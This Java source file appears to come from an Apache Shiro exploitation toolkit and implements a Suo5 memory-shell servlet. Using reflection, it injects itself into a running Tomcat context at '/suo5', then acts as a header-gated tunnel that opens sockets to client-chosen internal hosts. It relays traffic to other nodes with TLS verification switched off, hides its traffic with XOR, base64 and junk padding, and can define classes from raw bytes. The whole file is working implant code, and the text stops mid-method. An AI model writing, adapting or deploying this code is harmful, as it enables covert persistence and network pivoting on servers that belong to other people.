package com.y5neko.shiroexp.memshell;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Random;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

public class Suo5v2Servlet extends ClassLoader implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String path = "/suo5";
    public static String headerName;
    public static String headerValue;
    private static HashMap addrs = collectAddr();
    private static Hashtable ctx = new Hashtable();
    private final String CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789";
    private final int CHARACTERS_LENGTH = "abcdefghijklmnopqrstuvwxyz0123456789".length();
    private final int BUF_SIZE = 16384;
    private InputStream gInStream;
    private OutputStream gOutStream;
    private String gtunId;
    private int mode = 0;

    public Suo5v2Servlet() {
    }

    public Suo5v2Servlet(ClassLoader c) {
        super(c);
    }

    public Suo5v2Servlet(InputStream var1, OutputStream var2, String var3) {
        this.gInStream = var1;
        this.gOutStream = var2;
        this.gtunId = var3;
    }

    public Suo5v2Servlet(String var1, int var2) {
        this.gtunId = var1;
        this.mode = var2;
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        // 从请求头读取配置
        String headerNameFromHeader = this.request.getHeader("headerName");
        String headerValueFromHeader = this.request.getHeader("headerValue");

        // 设置值
        if (headerNameFromHeader != null && !headerNameFromHeader.isEmpty()) {
            headerName = headerNameFromHeader;
        }
        if (headerValueFromHeader != null && !headerValueFromHeader.isEmpty()) {
            headerValue = headerValueFromHeader;
        }

        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding("UTF-8");
            this.response.setCharacterEncoding("UTF-8");
            output.append(this.addServlet());
            output.append(" | Header-Name: " + headerName + " | Header-Value: " + headerValue);
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    public String addServlet() throws Exception {
        javax.servlet.ServletContext servletContext = this.request.getServletContext();
        Servlet servlet = this;

        Field contextField = null;
        org.apache.catalina.core.ApplicationContext applicationContext = null;
        StandardContext standardContext = null;

        String var11;
        try {
            contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            applicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(servletContext);
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            standardContext = (StandardContext)contextField.get(applicationContext);

            String existsMsg = null;
            // 检查Servlet是否已存在
            Container[] containers = standardContext.findChildren();
            for (Container container : containers) {
                if (container instanceof Wrapper) {
                    Wrapper existingWrapper = (Wrapper) container;
                    if (existingWrapper.getName().equals(this.path)) {
                        existsMsg = "Servlet already exists, overwriting...";
                        // 删除旧的Wrapper
                        standardContext.removeChild(existingWrapper);
                        break;
                    }
                }
            }

            // 创建新的Wrapper
            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(this.path);
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet(servlet);
            standardContext.addChild(wrapper);
            standardContext.addServletMappingDecoded(this.path, this.path);

            if (existsMsg != null) {
                return existsMsg + " Success";
            }
            return "Success";
        } catch (Exception var22) {
            var11 = var22.getMessage();
        }

        return var11;
    }

    public void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException {
        HttpServletRequest var3 = (HttpServletRequest)var1;
        HttpServletResponse var4 = (HttpServletResponse)var2;

        try {
            if (var3.getHeader(headerName) != null && var3.getHeader(headerName).contains(headerValue)) {
                (new Suo5v2Servlet()).process(var3, var4);
            }
        } catch (Throwable var6) {
        }

    }

    private void process(ServletRequest var1, ServletResponse var2) {
        HttpServletRequest var3 = (HttpServletRequest)var1;
        HttpServletResponse var4 = (HttpServletResponse)var2;
        String var5 = null;
        byte[] var6 = new byte[0];
        boolean var31 = false;

        label279: {
            ServletOutputStream var41;
            label271: {
                label280: {
                    try {
                        var31 = true;
                        ServletInputStream var7 = var3.getInputStream();
                        HashMap var8 = this.unmarshalBase64(var7);
                        byte[] var9 = (byte[])((byte[])var8.get("m"));
                        byte[] var10 = (byte[])((byte[])var8.get("ac"));
                        byte[] var11 = (byte[])((byte[])var8.get("id"));
                        byte[] var12 = (byte[])((byte[])var8.get("sid"));
                        if (var10 != null) {
                            if (var10.length == 1) {
                                if (var11 != null) {
                                    if (var11.length != 0) {
                                        if (var9 != null) {
                                            if (var9.length != 0) {
                                                if (var12 != null && var12.length > 0) {
                                                    var5 = new String(var12);
                                                }

                                                String var13 = new String(var11);
                                                byte var14 = var9[0];
                                                switch(var14) {
                                                    case 0:
                                                        var5 = this.randomString(16);
                                                        this.processHandshake(var3, var4, var8, var13, var5);
                                                        var31 = false;
                                                        break label271;
                                                    case 1:
                                                        this.setBypassHeader(var4);
                                                        this.processFullStream(var3, var4, var8, var13);
                                                        var31 = false;
                                                        break label271;
                                                    case 2:
                                                        this.setBypassHeader(var4);
                                                    case 3:
                                                        byte[] var15 = this.toByteArray(var7);
                                                        if (this.processRedirect(var3, var4, var8, var6, var15)) {
                                                            var31 = false;
                                                            break label271;
                                                        }

                                                        if (var12 != null && var12.length != 0 && this.getKey(new String(var12)) != null) {
                                                            ByteArrayInputStream var16 = new ByteArrayInputStream(var15);
                                                            int var17 = this.getDirtySize(var5);
                                                            if (var14 == 2) {
                                                                this.writeAndFlush(var4, this.processTemplateStart(var4, new String(var12)), var17);

                                                                while(true) {
                                                                    this.processHalfStream(var3, var4, var8, var13, var17);

                                                                    try {
                                                                        var8 = this.unmarshalBase64(var16);
                                                                        if (var8.isEmpty()) {
                                                                            break;
                                                                        }

                                                                        var13 = new String((byte[])((byte[])var8.get("id")));
                                                                    } catch (Exception var37) {
                                                                        break;
                                                                    }
                                                                }

                                                                this.writeAndFlush(var4, this.processTemplateEnd(var5), var17);
                                                                var31 = false;
                                                                break label271;
                                                            }

                                                            ByteArrayOutputStream var18 = new ByteArrayOutputStream();
                                                            var18.write(this.processTemplateStart(var4, new String(var12)));

                                                            while(true) {
                                                                this.processClassic(var3, var18, var8, var13);

                                                                try {
                                                                    var8 = this.unmarshalBase64(var16);
                                                                    if (var8.isEmpty()) {
                                                                        break;
                                                                    }

                                                                    var13 = new String((byte[])((byte[])var8.get("id")));
                                                                } catch (Exception var38) {
                                                                    break;
                                                                }
                                                            }

                                                            var18.write(this.processTemplateEnd(var5));
                                                            var4.setContentLength(var18.size());
                                                            this.writeAndFlush(var4, var18.toByteArray(), 0);
                                                            var31 = false;
                                                            break label271;
                                                        }

                                                        var4.setStatus(403);
                                                        var31 = false;
                                                        break label279;
                                                    default:
                                                        var31 = false;
                                                        break label271;
                                                }
                                            }

                                            var31 = false;
                                        } else {
                                            var31 = false;
                                        }
                                    } else {
                                        var31 = false;
                                    }
                                } else {
                                    var31 = false;
                                }
                            } else {
                                var31 = false;
                            }
                        } else {
                            var31 = false;
                        }
                        break label280;
                    } catch (Throwable var39) {
                        var31 = false;
                    } finally {
                        if (var31) {
                            try {
                                ServletOutputStream var21 = var4.getOutputStream();
                                var21.flush();
                                var21.close();
                            } catch (Throwable var32) {
                            }

                        }
                    }

                    try {
                        var41 = var4.getOutputStream();
                        var41.flush();
                        var41.close();
                    } catch (Throwable var34) {
                    }

                    return;
                }

                try {
                    ServletOutputStream var42 = var4.getOutputStream();
                    var42.flush();
                    var42.close();
                } catch (Throwable var36) {
                }

                return;
            }

            try {
                var41 = var4.getOutputStream();
                var41.flush();
                var41.close();
            } catch (Throwable var35) {
            }

            return;
        }

        try {
            ServletOutputStream var43 = var4.getOutputStream();
            var43.flush();
            var43.close();
        } catch (Throwable var33) {
        }

    }

    private void setBypassHeader(HttpServletResponse var1) {
        var1.setBufferSize(16384);
        var1.setHeader("X-Accel-Buffering", "no");
    }

    private byte[] processTemplateStart(HttpServletResponse var1, String var2) throws Exception {
        byte[] var3 = new byte[0];
        Object var4 = this.getKey(var2);
        if (var4 == null) {
            return var3;
        } else {
            String[] var5 = (String[])((String[])var4);
            if (var5.length != 3) {
                return var3;
            } else {
                var1.setHeader("Content-Type", var5[0]);
                return var5[1].getBytes();
            }
        }
    }

    private byte[] processTemplateEnd(String var1) {
        byte[] var2 = new byte[0];
        Object var3 = this.getKey(var1);
        if (var3 == null) {
            return var2;
        } else {
            String[] var4 = (String[])((String[])var3);
            return var4.length != 3 ? var2 : var4[2].getBytes();
        }
    }

    private int getDirtySize(String var1) {
        Object var2 = this.getKey(var1 + "_jk");
        return var2 == null ? 0 : (Integer)var2;
    }

    private boolean processRedirect(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, byte[] var4, byte[] var5) throws Exception {
        byte[] var6 = (byte[])((byte[])var3.get("r"));
        var3.remove("r");
        boolean var7 = var6 != null && var6.length > 0;
        if (var7 && !this.isLocalAddr(new String(var6))) {
            HttpURLConnection var8 = null;

            try {
                ByteArrayOutputStream var9 = new ByteArrayOutputStream();
                var9.write(var4);
                var9.write(this.marshalBase64(var3));
                var9.write(var5);
                byte[] var10 = var9.toByteArray();
                var8 = this.redirect(var1, new String(var6), var10);
                this.pipeStream(var8.getInputStream(), var2.getOutputStream(), false);
            } finally {
                if (var8 != null) {
                    var8.disconnect();
                }

            }

            return true;
        } else {
            return false;
        }
    }

    private void processHandshake(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, String var4, String var5) throws Exception {
        byte[] var6 = (byte[])((byte[])var3.get("r"));
        boolean var7 = var6 != null && var6.length > 0;
        if (var7 && !this.isLocalAddr(new String(var6))) {
            var2.setStatus(403);
        } else {
            byte[] var8 = (byte[])((byte[])var3.get("tpl"));
            byte[] var9 = (byte[])((byte[])var3.get("ct"));
            if (var8 != null && var8.length > 0 && var9 != null && var9.length > 0) {
                String var10 = new String(var8);
                String[] var11 = var10.split("#data#", 2);
                this.putKey(var5, new String[]{new String(var9), var11[0], var11[1]});
            } else {
                this.putKey(var5, new String[0]);
            }

            byte[] var15 = (byte[])((byte[])var3.get("jk"));
            if (var15 != null && var15.length > 0) {
                int var16 = 0;

                try {
                    var16 = Integer.parseInt(new String(var15));
                } catch (NumberFormatException var14) {
                }

                if (var16 < 0) {
                    var16 = 0;
                }

                this.putKey(var5 + "_jk", var16);
            }

            byte[] var17 = (byte[])((byte[])var3.get("a"));
            boolean var12 = var17 != null && var17.length > 0 && var17[0] == 1;
            if (var12) {
                this.setBypassHeader(var2);
                this.writeAndFlush(var2, this.processTemplateStart(var2, var5), 0);
                this.writeAndFlush(var2, this.marshalBase64(this.newData(var4, (byte[])((byte[])var3.get("dt")))), 0);
                Thread.sleep(2000L);
                this.writeAndFlush(var2, this.marshalBase64(this.newData(var4, var5.getBytes())), 0);
                this.writeAndFlush(var2, this.processTemplateEnd(var5), 0);
            } else {
                ByteArrayOutputStream var13 = new ByteArrayOutputStream();
                var13.write(this.processTemplateStart(var2, var5));
                var13.write(this.marshalBase64(this.newData(var4, (byte[])((byte[])var3.get("dt")))));
                var13.write(this.marshalBase64(this.newData(var4, var5.getBytes())));
                var13.write(this.processTemplateEnd(var5));
                var2.setContentLength(var13.size());
                this.writeAndFlush(var2, var13.toByteArray(), 0);
            }

        }
    }

    private void processFullStream(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, String var4) throws Exception {
        ServletInputStream var5 = var1.getInputStream();
        String var6 = new String((byte[])((byte[])var3.get("h")));
        int var7 = Integer.parseInt(new String((byte[])((byte[])var3.get("p"))));
        if (var7 == 0) {
            var7 = this.getServerPort(var1);
        }

        Socket var8 = null;

        try {
            var8 = new Socket();
            var8.setTcpNoDelay(true);
            var8.setReceiveBufferSize(131072);
            var8.setSendBufferSize(131072);
            var8.connect(new InetSocketAddress(var6, var7), 5000);
            this.writeAndFlush(var2, this.marshalBase64(this.newStatus(var4, (byte)0)), 0);
        } catch (Exception var27) {
            if (var8 != null) {
                var8.close();
            }

            this.writeAndFlush(var2, this.marshalBase64(this.newStatus(var4, (byte)1)), 0);
            return;
        }

        Thread var9 = null;
        boolean var10 = true;

        try {
            OutputStream var11 = var8.getOutputStream();
            InputStream var12 = var8.getInputStream();
            ServletOutputStream var13 = var2.getOutputStream();
            Suo5v2Servlet var14 = new Suo5v2Servlet(var12, var13, var4);
            var9 = new Thread(var14);
            var9.start();

            while(true) {
                HashMap var15 = this.unmarshalBase64(var5);
                if (var15.isEmpty()) {
                    break;
                }

                byte var16 = ((byte[])((byte[])var15.get("ac")))[0];
                switch(var16) {
                    case 0:
                    case 2:
                        var10 = false;
                        break;
                    case 1:
                        byte[] var17 = (byte[])((byte[])var15.get("dt"));
                        if (var17.length != 0) {
                            var11.write(var17);
                            var11.flush();
                        }
                        break;
                    case 16:
                        this.writeAndFlush(var2, this.marshalBase64(this.newHeartbeat(var4)), 0);
                }
            }
        } catch (Exception var28) {
        } finally {
            try {
                var8.close();
            } catch (Exception var26) {
            }

            if (var10) {
                this.writeAndFlush(var2, this.marshalBase64(this.newDel(var4)), 0);
            }

            if (var9 != null) {
                var9.join();
            }

        }

    }

    private void processHalfStream(HttpServletRequest var1, HttpServletResponse var2, HashMap var3, String var4, int var5) throws Exception {
        boolean var6 = false;
        boolean var7 = true;

        try {
            byte var8 = ((byte[])((byte[])var3.get("ac")))[0];
            switch(var8) {
                case 0:
                    byte[] var9 = this.performCreate(var1, var3, var4, var6);
                    this.writeAndFlush(var2, var9, var5);
                    Object[] var10 = (Object[])((Object[])this.getKey(var4));
                    if (var10 == null) {
                        throw new IOException("tunnel not found");
                    }

                    SocketChannel var11 = (SocketChannel)var10[0];
                    ByteBuffer var12 = ByteBuffer.allocate(16384);

                    while(true) {
                        try {
                            byte[] var13 = this.readSocketChannel(var11, var12);
                            if (var13.length == 0) {
                                return;
                            }

                            this.writeAndFlush(var2, this.marshalBase64(this.newData(var4, var13)), var5);
                        } catch (Exception var14) {
                            return;
                        }
                    }
                case 1:
                    this.performWrite(var3, var4, var6);
                    break;
                case 2:
                    var7 = false;
                    this.performDelete(var4);
                    break;
                case 16:
                    this.writeAndFlush(var2, this.marshalBase64(this.newHeartbeat(var4)), var5);
            }
        } catch (Exception var15) {
            this.performDelete(var4);
            if (var7) {
                this.writeAndFlush(var2, this.marshalBase64(this.newDel(var4)), var5);
            }
        }

    }

    private void processClassic(HttpServletRequest var1, ByteArrayOutputStream var2, HashMap var3, String var4) throws Exception {
        boolean var5 = true;
        boolean var6 = true;

        try {
            byte var7 = ((byte[])((byte[])var3.get("ac")))[0];
            switch(var7) {
                case 0:
                    byte[] var8 = this.performCreate(var1, var3, var4, var6);
                    var2.write(var8);
                    break;
                case 1:
                    this.performWrite(var3, var4, var6);
                    byte[] var9 = this.performRead(var4);
                    var2.write(var9);
                    break;
                case 2:
                    var5 = false;
                    this.performDelete(var4);
            }
        } catch (Exception var10) {
            this.performDelete(var4);
            if (var5) {
                var2.write(this.marshalBase64(this.newDel(var4)));
            }
        }

    }

    private void writeAndFlush(HttpServletResponse var1, byte[] var2, int var3) throws Exception {
        if (var2 != null && var2.length != 0) {
            ServletOutputStream var4 = var1.getOutputStream();
            var4.write(var2);
            if (var3 != 0) {
                var4.write(this.marshalBase64(this.newDirtyChunk(var3)));
            }

            var4.flush();
            var1.flushBuffer();
        }
    }

    private byte[] performCreate(HttpServletRequest var1, HashMap var2, String var3, boolean var4) throws Exception {
        String var5 = new String((byte[])((byte[])var2.get("h")));
        int var6 = Integer.parseInt(new String((byte[])((byte[])var2.get("p"))));
        if (var6 == 0) {
            var6 = this.getServerPort(var1);
        }

        ByteArrayOutputStream var7 = new ByteArrayOutputStream();
        SocketChannel var8 = null;
        HashMap var9 = null;

        try {
            var8 = SocketChannel.open();
            var8.socket().setTcpNoDelay(true);
            var8.socket().setReceiveBufferSize(131072);
            var8.socket().setSendBufferSize(131072);
            var8.socket().connect(new InetSocketAddress(var5, var6), 3000);
            var8.configureBlocking(true);
            var9 = this.newStatus(var3, (byte)0);
            LinkedBlockingQueue var10 = new LinkedBlockingQueue(100);
            LinkedBlockingQueue var11 = new LinkedBlockingQueue();
            this.putKey(var3, new Object[]{var8, var10, var11});
            if (var4) {
                (new Thread(new Suo5v2Servlet(var3, 1))).start();
                (new Thread(new Suo5v2Servlet(var3, 2))).start();
            }
        } catch (Exception var13) {
            if (var8 != null) {
                try {
                    var8.close();
                } catch (Exception var12) {
                }
            }

            var9 = this.newStatus(var3, (byte)1);
        }

        var7.write(this.marshalBase64(var9));
        return var7.toByteArray();
    }

    private void performWrite(HashMap var1, String var2, boolean var3) throws Exception {
        Object[] var4 = (Object[])((Object[])this.getKey(var2));
        if (var4 == null) {
            throw new IOException("tunnel not found");
        } else {
            SocketChannel var5 = (SocketChannel)var4[0];
            if (!var5.isConnected()) {
                throw new IOException("socket not connected");
            } else {
                byte[] var6 = (byte[])((byte[])var1.get("dt"));
                if (var6.length != 0) {
                    if (var3) {
                        BlockingQueue var7 = (BlockingQueue)var4[2];
                        var7.put(var6);
                    } else {
                        ByteBuffer var8 = ByteBuffer.wrap(var6);

                        while(var8.hasRemaining()) {
                            var5.write(var8);
                        }
                    }
                }

            }
        }
    }

    private byte[] performRead(String var1) throws Exception {
        Object[] var2 = (Object[])((Object[])this.getKey(var1));
        if (var2 == null) {
            throw new IOException("tunnel not found");
        } else {
            SocketChannel var3 = (SocketChannel)var2[0];
            if (!var3.isConnected()) {
                throw new IOException("socket not connected");
            } else {
                ByteArrayOutputStream var4 = new ByteArrayOutputStream();
                BlockingQueue var5 = (BlockingQueue)var2[1];
                int var6 = 524288;
                int var7 = 0;

                do {
                    byte[] var8 = (byte[])var5.poll();
                    if (var8 == null) {
                        break;
                    }

                    var7 += var8.length;
                    var4.write(this.marshalBase64(this.newData(var1, var8)));
                } while(var7 < var6);

                return var4.toByteArray();
            }
        }
    }

    private void performDelete(String var1) {
        Object[] var2 = (Object[])((Object[])this.getKey(var1));
        if (var2 != null) {
            this.removeKey(var1);
            SocketChannel var3 = (SocketChannel)var2[0];
            BlockingQueue var4 = (BlockingQueue)var2[2];

            try {
                var4.put(new byte[0]);
                var3.close();
            } catch (Exception var6) {
            }
        }

    }

    private int getServerPort(HttpServletRequest var1) throws Exception {
        int var2;
        try {
            var2 = (Integer)var1.getClass().getMethod("getLocalPort").invoke(var1);
        } catch (Exception var4) {
            var2 = (Integer)var1.getClass().getMethod("getServerPort").invoke(var1);
        }

        return var2;
    }

    private void pipeStream(InputStream var1, OutputStream var2, boolean var3) throws Exception {
        try {
            byte[] var4 = new byte[8192];

            while(true) {
                int var5 = var1.read(var4);
                if (var5 <= 0) {
                    return;
                }

                byte[] var6 = this.copyOfRange(var4, 0, 0 + var5);
                if (var3) {
                    var6 = this.marshalBase64(this.newData(this.gtunId, var6));
                }

                var2.write(var6);
                var2.flush();
            }
        } finally {
            if (var1 != null) {
                try {
                    var1.close();
                } catch (Exception var12) {
                }
            }

        }
    }

    private byte[] readSocketChannel(SocketChannel var1, ByteBuffer var2) throws IOException {
        var2.clear();
        int var3 = var1.read(var2);
        if (var3 <= 0) {
            return new byte[0];
        } else {
            var2.flip();
            byte[] var4 = new byte[var2.remaining()];
            var2.get(var4);
            return var4;
        }
    }

    private static HashMap collectAddr() {
        HashMap var0 = new HashMap();

        try {
            Enumeration var1 = NetworkInterface.getNetworkInterfaces();

            while(var1.hasMoreElements()) {
                NetworkInterface var2 = (NetworkInterface)var1.nextElement();
                Enumeration var3 = var2.getInetAddresses();

                while(var3.hasMoreElements()) {
                    InetAddress var4 = (InetAddress)var3.nextElement();
                    String var5 = var4.getHostAddress();
                    if (var5 != null) {
                        int var6 = var5.indexOf(37);
                        if (var6 != -1) {
                            var5 = var5.substring(0, var6);
                        }

                        var0.put(var5, Boolean.TRUE);
                    }
                }
            }
        } catch (Exception var7) {
        }

        return var0;
    }

    private boolean isLocalAddr(String var1) throws Exception {
        String var2 = (new URL(var1)).getHost();
        return addrs.containsKey(var2);
    }

    private HttpURLConnection redirect(HttpServletRequest var1, String var2, byte[] var3) throws Exception {
        String var4 = var1.getMethod();
        URL var5 = new URL(var2);
        HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
        var6.setRequestMethod(var4);

        try {
            var6.getClass().getMethod("setConnectTimeout", Integer.TYPE).invoke(var6, new Integer(3000));
            var6.getClass().getMethod("setReadTimeout", Integer.TYPE).invoke(var6, new Integer(0));
        } catch (Exception var9) {
        }

        var6.setDoOutput(true);
        var6.setDoInput(true);
        if (HttpsURLConnection.class.isInstance(var6)) {
            ((HttpsURLConnection)var6).setHostnameVerifier(this);
            SSLContext var7 = SSLContext.getInstance("SSL");
            var7.init((KeyManager[])null, new TrustManager[]{this}, (SecureRandom)null);
            ((HttpsURLConnection)var6).setSSLSocketFactory(var7.getSocketFactory());
        }

        Enumeration var10 = var1.getHeaderNames();

        while(var10.hasMoreElements()) {
            String var8 = (String)var10.nextElement();
            if (var8.equalsIgnoreCase("Content-Length")) {
                var6.setRequestProperty(var8, String.valueOf(var3.length));
            } else if (var8.equalsIgnoreCase("Host")) {
                var6.setRequestProperty(var8, var5.getHost());
            } else if (var8.equalsIgnoreCase("Connection")) {
                var6.setRequestProperty(var8, "close");
            } else if (!var8.equalsIgnoreCase("Content-Encoding") && !var8.equalsIgnoreCase("Transfer-Encoding")) {
                var6.setRequestProperty(var8, var1.getHeader(var8));
            }
        }

        OutputStream var11 = var6.getOutputStream();
        var11.write(var3);
        var11.flush();
        var11.close();
        var6.getResponseCode();
        return var6;
    }

    private byte[] toByteArray(InputStream var1) {
        try {
            ByteArrayOutputStream var2 = new ByteArrayOutputStream();
            byte[] var3 = new byte[4096];

            int var4;
            while((var4 = var1.read(var3)) != -1) {
                var2.write(var3, 0, var4);
            }

            return var2.toByteArray();
        } catch (IOException var5) {
            return new byte[0];
        }
    }

    private void readFull(InputStream var1, byte[] var2) throws IOException {
        int var5;
        for(int var3 = 0; var3 < var2.length; var3 += var5) {
            int var4 = var2.length - var3;
            var5 = var1.read(var2, var3, var4);
            if (var5 == -1) {
                throw new IOException("stream EOF");
            }
        }

    }

    public HashMap newDirtyChunk(int var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{17});
        if (var1 > 0) {
            byte[] var3 = new byte[var1];
            (new Random()).nextBytes(var3);
            var2.put("d", var3);
        }

        return var2;
    }

    private HashMap newData(String var1, byte[] var2) {
        HashMap var3 = new HashMap();
        var3.put("ac", new byte[]{1});
        var3.put("dt", var2);
        var3.put("id", var1.getBytes());
        return var3;
    }

    private HashMap newDel(String var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{2});
        var2.put("id", var1.getBytes());
        return var2;
    }

    private HashMap newStatus(String var1, byte var2) {
        HashMap var3 = new HashMap();
        var3.put("ac", new byte[]{3});
        var3.put("s", new byte[]{var2});
        var3.put("id", var1.getBytes());
        return var3;
    }

    private HashMap newHeartbeat(String var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{16});
        var2.put("id", var1.getBytes());
        return var2;
    }

    private byte[] u32toBytes(int var1) {
        byte[] var2 = new byte[]{(byte)(var1 >> 24), (byte)(var1 >> 16), (byte)(var1 >> 8), (byte)var1};
        return var2;
    }

    private int bytesToU32(byte[] var1) {
        return (var1[0] & 255) << 24 | (var1[1] & 255) << 16 | (var1[2] & 255) << 8 | (var1[3] & 255) << 0;
    }

    private void putKey(String var1, Object var2) {
        ctx.put(var1, var2);
    }

    private Object getKey(String var1) {
        return ctx.get(var1);
    }

    private void removeKey(String var1) {
        ctx.remove(var1);
    }

    private byte[] copyOfRange(byte[] var1, int var2, int var3) {
        int var4 = var3 - var2;
        if (var4 < 0) {
            throw new IllegalArgumentException(var2 + " > " + var3);
        } else {
            byte[] var5 = new byte[var4];
            int var6 = Math.min(var1.length - var2, var4);

            for(int var7 = 0; var7 < var6; ++var7) {
                var5[var7] = var1[var2 + var7];
            }

            return var5;
        }
    }

    private String base64UrlEncode(byte[] var1) throws Exception {
        String var3 = null;

        Class var2;
        try {
            var2 = Class.forName("java.util.Base64");
            Object var4 = var2.getMethod("getEncoder").invoke(var2);
            var3 = (String)var4.getClass().getMethod("encodeToString", byte[].class).invoke(var4, var1);
        } catch (Exception var7) {
            try {
                var2 = Class.forName("sun.misc.BASE64Encoder");
                Object var5 = var2.newInstance();
                var3 = (String)var5.getClass().getMethod("encode", byte[].class).invoke(var5, var1);
                var3 = var3.replaceAll("\\s+", "");
            } catch (Exception var6) {
            }
        }

        if (var3 != null) {
            for(var3 = var3.replace('+', '-').replace('/', '_'); var3.endsWith("="); var3 = var3.substring(0, var3.length() - 1)) {
            }
        }

        return var3;
    }

    private byte[] base64UrlDecode(String var1) throws Exception {
        if (var1 == null) {
            return null;
        } else {
            for(var1 = var1.replace('-', '+').replace('_', '/'); var1.length() % 4 != 0; var1 = var1 + "=") {
            }

            byte[] var3 = null;

            Class var2;
            try {
                var2 = Class.forName("java.util.Base64");
                Object var4 = var2.getMethod("getDecoder").invoke(var2);
                var3 = (byte[])((byte[])var4.getClass().getMethod("decode", String.class).invoke(var4, var1));
            } catch (Exception var7) {
                try {
                    var2 = Class.forName("sun.misc.BASE64Decoder");
                    Object var5 = var2.newInstance();
                    var3 = (byte[])((byte[])var5.getClass().getMethod("decodeBuffer", String.class).invoke(var5, var1));
                } catch (Exception var6) {
                }
            }

            return var3;
        }
    }

    private byte[] marshalBase64(HashMap var1) throws Exception {
        Random var2 = new Random();
        int var3 = var2.nextInt(32);
        if (var3 > 0) {
            byte[] var4 = new byte[var3];
            var2.nextBytes(var4);
            var1.put("_", var4);
        }

        ByteArrayOutputStream var11 = new ByteArrayOutputStream();
        Object[] var5 = var1.keySet().toArray();

        for(int var6 = 0; var6 < var5.length; ++var6) {
            String var7 = (String)var5[var6];
            byte[] var8 = (byte[])((byte[])var1.get(var7));
            var11.write((byte)var7.length());
            var11.write(var7.getBytes());
            var11.write(this.u32toBytes(var8.length));
            var11.write(var8);
        }

        byte[] var12 = new byte[]{(byte)((int)(Math.random() * 255.0D + 1.0D)), (byte)((int)(Math.random() * 255.0D + 1.0D))};
        byte[] var13 = var11.toByteArray();

        for(int var14 = 0; var14 < var13.length; ++var14) {
            var13[var14] ^= var12[var14 % 2];
        }

        var13 = this.base64UrlEncode(var13).getBytes();
        ByteBuffer var15 = ByteBuffer.allocate(6);
        var15.put(var12);
        var15.putInt(var13.length);
        byte[] var9 = var15.array();

        for(int var10 = 2; var10 < 6; ++var10) {
            var9[var10] ^= var12[var10 % 2];
        }

        var9 = this.base64UrlEncode(var9).getBytes();
        var15 = ByteBuffer.allocate(8 + var13.length);
        var15.put(var9);
        var15.put(var13);
        return var15.array();
    }

    private HashMap unmarshalBase64(InputStream var1) throws Exception {
        HashMap var2 = new HashMap();
        byte[] var3 = new byte[8];
        this.readFull(var1, var3);
        var3 = this.base64UrlDecode(new String(var3));
        if (var3 != null && var3.length != 0) {
            byte[] var4 = new byte[]{var3[0], var3[1]};

            for(int var5 = 2; var5 < 6; ++var5) {
                var3[var5] ^= var4[var5 % 2];
            }

            ByteBuffer var14 = ByteBuffer.wrap(var3, 2, 4);
            int var6 = var14.getInt();
            if (var6 > 33554432) {
                throw new IOException("invalid len");
            } else {
                byte[] var7 = new byte[var6];
                this.readFull(var1, var7);
                var7 = this.base64UrlDecode(new String(var7));

                for(int var8 = 0; var8 < var7.length; ++var8) {
                    var7[var8] ^= var4[var8 % 2];
                }

                int var9 = 0;

